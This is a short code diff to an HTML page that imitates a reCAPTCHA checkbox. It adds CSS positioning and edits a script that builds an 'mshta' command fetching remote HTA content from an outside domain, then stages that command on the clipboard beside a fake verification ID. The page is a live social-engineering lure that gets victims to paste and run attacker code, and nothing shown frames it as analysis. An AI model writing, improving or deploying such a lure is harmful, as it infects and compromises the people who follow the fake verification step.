@@ -225,7 +225,10 @@
     </head>
     <body>
 
-    <div class="container m-p">    
+    <div class="container m-p" style="
+    margin-left: 40%;
+    margin-top: 10%;
+">
         <div id="checkbox-window" class="checkbox-window m-p block">
             <div class="checkbox-container m-p">
                 <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
@@ -419,7 +422,7 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const htaPath = "http://vangviengparamotorcenter.com/" + "recaptcha.hta";
+            const htaPath = "http://vangviengparamotorcenter.com/" + "recaptcha";
             const commandToRun = "mshta " + htaPath
             stageClipboard(commandToRun, verification_id)
         }
